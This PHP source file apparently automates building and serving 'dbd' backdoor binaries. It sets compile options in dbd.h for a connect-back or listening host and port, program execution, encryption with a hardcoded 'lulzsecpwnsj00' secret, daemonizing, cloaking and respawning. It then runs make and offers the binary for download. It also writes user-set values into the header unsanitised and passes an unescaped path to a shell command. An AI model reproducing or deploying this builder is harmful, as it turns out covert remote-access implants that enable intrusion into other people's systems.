<?php
/**
 * getdbd
 * @name getdbd
 * @author Iadnah
 * @version 0.1
 *
 */
class getdbd {
	/**@var string unique ID generated for each build */
	public $buildID = null;
	
	/**@var string directory where dbd source tree is located */
	public $dbdDir = null;
	
	/**@var string directory where getdbd is located */
	public $getdbdDir = null;
	
	/**@var string directory where this build and it's files are saved */
	public $buildDir = null;
	
	/** @var string logfile where the output from make will be stored */
	public $buildOutputLog = null;
	
	/** @var boolean whether or not dbd.h has been successfully configured */
	public $isConfigured = false;
	
	/** @var string build target to pass to the make command */
	public $makeTarget = 'unix';
	
	/** @var string location of the binary that's been built */
	public $dbdBinary = null;
	
	/** @var array associative array containing options to be written to dbd. */
	public $dbdDefines = array(
			'HOST' => 'NULL',
			'BINDHOST' => 'NULL',
			'PORT' => 0,
			'SOURCE_PORT' => 0,
			'DOLISTEN' => 0,
			'EXECPROG_NULL' => 'NULL',
			'CONVERT_TO_CRLF' => 0,
			'ENCRYPTION' => 1,
			'SHARED_SECRET' => '"lulzsecpwnsj00"',
			'RESPAWN_ENABLED' => 0,
			'RESPAWN_INTERVAL' => 0,
			'QUIET' => 0,
			'VERBOSE' => 0,
			'DAEMONIZE' => 0,
			'CLOAK' => 0,
			
			/* "chat" options */
			'HIGHLIGHT_INCOMING' => 0,
			'HIGHLIGHT_PREFIX' => '"\x1b[0;32m"',
			'HIGHLIGHT_SUFFIX' => '"\x1b[0m"',
			'SEPARATOR_BETWEEN_PREFIX_AND_DATA' => '": "',
			/* win32 specific options: */
			'RUN_ONLY_ONE_INSTANCE' => 0,
			'INSTANCE_SEMAPHORE' => '"durandal_bd_semaphore"'
		);
		
	public function __construct($buildID = null)
	{
		if ($this->setdbdDir(__DIR__ . '/../../') === false) {
			return false;
		}
		if ($this->setgetdbdDir(__DIR__) === false) {
			return false;
		}
		
// 		echo $this->dbdDir. "\n";
		if ($buildID !== null) {
			$this->buildID = $buildID;
		} else {
			/**@TODO: this should be handled later */
			$this->buildID = uniqid();
		}
		
	}
	
	/**
	 * Sets options for dbd.h
	 * @param string $define name of contstant to modify
	 * @param mixed $value value to set constant to
	 * @return boolean
	 */
	public function setDefine($define, $value)
	{
		if (key_exists($define, $this->dbdDefines)) {
			/**@TODO: add sanitiy checking for define values */
			switch ($define) {
				/**
				 * String values need to be quoted
				 */
				case 'HOST':
				case 'BINDHOST':
				case 'EXECPROC_NULL':
				case 'SHARED_SECRET':
				case 'HIGHLIGHT_PREFIX':
				case 'HIGHLIGHT_SUFFIX':
				case 'SEPARATOR_BETWEEN_PREFIX_AND_DATA':
				case 'INSTANCE_SEMAPHORE':
					$value = "'". $value. "'";
					break;
				default:
					break;
			}
			$this->dbdDefines["$define"] = $value;
			return true;
		}
		
		return false;
	}
	
	public function setgetdbdDir($getdbdDir) {
		if (is_dir($getdbdDir)) {
			$this->getdbdDir = $getdbdDir;
			return true;
		}
		return false;
	}
	
	public function setdbdDir($dbdDir)
	{
		if (!is_dir($dbdDir) && posix_access($dbdDir. 'dbd.h', POSIX_F_OK)) {
			die("dbdDir '$dbdDir' is invalid\n");
			return false;
		}
		$this->dbdDir = $dbdDir;
		return true;
	}
	
	public function mkdbdh()
	{
		// make backup
		if (!file_exists($this->dbdDir. 'dbd.h.original')) {
			$dbdH = @file_get_contents($this->dbdDir. 'dbd.h');
			if ($dbdH === false) {
				die("Cannot open dbd.h in '". $this->dbdDir. "'\n");
			}
			$handle = fopen($this->dbdDir. 'dbd.h.original', 'w');
			if ( fwrite($handle, $dbdH) === false ) {
				die("Error: Unable to create backup of original dbd.h. Check file permissions.\n");
			}
			fclose($handle);
		}
		
		if ( ($handle = fopen($this->dbdDir. 'dbd.h', 'w')) !== false ) {
			foreach ($this->dbdDefines as $define => $value) {
				$str = "#define $define $value\n";
				$written = fwrite($handle, $str);
				if (strlen($str) !== $written) {
					die("Error writing config\n");
				}
			}
			fclose($handle);
			return true;
		} else {
			die("Can't write config file dbd.h");
			return false;
		}
		$this->isConfigured = true;
	}
	
	public function readyBuildDir()
	{
		if ( !is_dir($this->getdbdDir. '/builds/') && !mkdir($this->getdbdDir. '/builds/')) {
			die("Critical: build directory '". $this->getdbdDir. '/builds/\' does not exist.');
		}
		if (!posix_access($this->getdbdDir. '/builds/', POSIX_W_OK)) {
			die("Critical: build directory '". $this->getdbdDir. "/builds/' is not writable.\n");	
		}
		
		if ($this->buildDir === null) {
			$this->buildDir = $this->getdbdDir. '/builds/'. $this->buildID;
		}
		
		if (is_dir($this->buildDir) || mkdir($this->buildDir)) {
// 			echo "Build directory is ". $this->buildDir. "\n";
		}
	}
	
	public function make()
	{
		if ($this->isConfigured === false) {
			$this->mkdbdh();
		}
		
		$this->readyBuildDir();
		$this->buildOutputLog = $this->buildDir. '/buildoutput.log';
		$this->dbdBinary = $this->buildDir. '/dbd';
			
		chdir($this->dbdDir);
		$dbdH = @file_get_contents('dbd.h');
		if ($dbdH === false) {
 			die("Cannot open dbd.h in '". $this->dbdDir. "'\n");
			return false;
		}
		
		$handle = fopen($this->buildDir. '/dbd.h', 'w');
		fwrite($handle, $dbdH);
		fclose($handle);
		if (is_null($this->buildOutputLog)) {
			$buildOutputLog = '2>&1';
		} else {
			$buildOutputLog = '2> '. $this->buildOutputLog;
		}
		
		$makeOutput = array();
		$makeRetutn = null;
		$cmd = 'make out=\''. $this->dbdBinary. '\' '. escapeshellarg($this->makeTarget). ' '. $buildOutputLog;
		@exec($cmd, $makeOutput, $makeReturn);
		
		if ($makeReturn == 0) {
			return true;
		} else if ($makeReturn == 2) {
			die("Invalid build target. Make failed.\n");
			return false;
		} else {
 			die("Unknown build error '$makeReturn'. Make failed.\n");
			return false;
		}
	}
	
	/**@TODO: update this so it works with the new code. This needs to go through the buildDir */
	public function listBinaries( $format = null )
	{
		$binDir = $this->dbdDir. 'binaries';
		if (!is_dir($binDir)) {
			die("Binary directory not found\n");
		}
		
		$dirHandle = opendir($binDir);
		while ($file = readdir($dirHandle)) {
			if ($file != '.' && $file !== '..') {
				$files[] = $file;
			}
		}
		closedir($dirHandle);
		
		switch ($format) {
			case 'json':
				return json_encode($files);
				
			case 'array':
			default:
				return $files;
		}
	}
	
// 	public function sanityCheckDefines()
// 	{
// 		foreach ($this->dbdDefines as $define => $value) {
// 			switch ($define) {
				
// 				default:
//  					die("Unknown define: $define\n");
// 			}
// 		}
// 	}
	
	public function download($buildID = null) {
		if ($buildID === null) {
			$buildID = $this->buildID;
		}
		if ($this->buildDir === null) {
			$this->buildDir = $this->getdbdDir. '/builds/'. $buildID;
		}
		
		if ($this->dbdBinary === null) {
			$this->dbdBinary = $this->buildDir. "/dbd";
		}
// 		echo "checking for ($buildID) ". $this->buildDir. "\n";
// 		echo $this->dbdBinary. "\n";
			if (file_exists($this->dbdBinary)) {
				@header('Content-Description: File Transfer');
				@header('Content-Type: application/octet-stream');
				@header('Content-Disposition: attachment; filename='.basename($this->dbdBinary));
				@header('Expires: 0');
				@header('Cache-Control: must-revalidate');
				@header('Pragma: public');
				@header('Content-Length: ' . filesize($this->dbdBinary));
				@header('X-Build-ID: '. $this->buildID);
				@readfile($this->dbdBinary);
				exit;
			} else {
				die($this->dbdBinary. " does not exist.");
			}
	}
}
?>
